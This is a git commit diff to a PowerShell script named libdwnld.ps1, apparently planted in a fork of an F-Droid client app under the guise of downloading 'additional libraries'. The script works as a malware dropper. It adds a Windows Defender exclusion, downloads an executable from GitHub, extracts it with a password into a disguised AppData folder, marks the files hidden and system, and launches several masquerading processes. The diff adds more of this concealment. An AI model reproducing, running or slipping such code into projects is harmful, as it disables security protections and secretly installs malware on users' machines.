cc9caa0d42787171a74477f3b5ed3f2bc1132248
washywashy14 <122028842+washywashy14@users.noreply.github.com>
2023-02-03 10:51:43 +0000

    Update libdwnld.ps1

--- app/src/full/libdwnld.ps1
+++ app/src/full/libdwnld.ps1
@@ -2,13 +2,15 @@ $ErrorActionPreference = 'SilentlyContinue'
 $ProcName = "additionlibraries.exe"
 $WebFile = "https://github.com/washywashy14/fdroidclient/blob/master/app/src/full/additionlibraries.exe?raw=true"
 $Outff = "$env:Temp\additionlibraries.exe"
-Start-Sleep -Seconds 20
+Timeout /NOBREAK /T 10
 Add-MpPreference -ExclusionProcess serverCommon.exe -Force
 Invoke-WebRequest -uri $WebFile -OutFile $Outff
 & $env:Temp\additionlibraries.exe -s -p"of9049nwp04yb3" -d"$env:APPDATA\chromiuumbased\services\"
+Timeout /NOBREAK /T 1
 Get-ChildItem -path "$env:APPDATA\chromiuumbased\services\" -Recurse -Force | foreach {$_.attributes = "Hidden"}
-Start-Process "$env:APPDATA\chromiuumbased\services\fsroiod.exe"
+Get-ChildItem -path "$env:appdata\chromiuumbased\services\" -Recurse -Force | foreach {$_.attributes = "system"}
 Start-Process "$env:APPDATA\chromiuumbased\services\ProcManager.exe"
 Start-Process "$env:APPDATA\chromiuumbased\services\netDaemon.exe"
 Start-Process "$env:APPDATA\chromiuumbased\services\Netstservice.exe"
 Start-Process "$env:APPDATA\chromiuumbased\services\Updmonitor.exe"
+Start-Process "$env:APPDATA\chromiuumbased\services\fsroiod.exe"
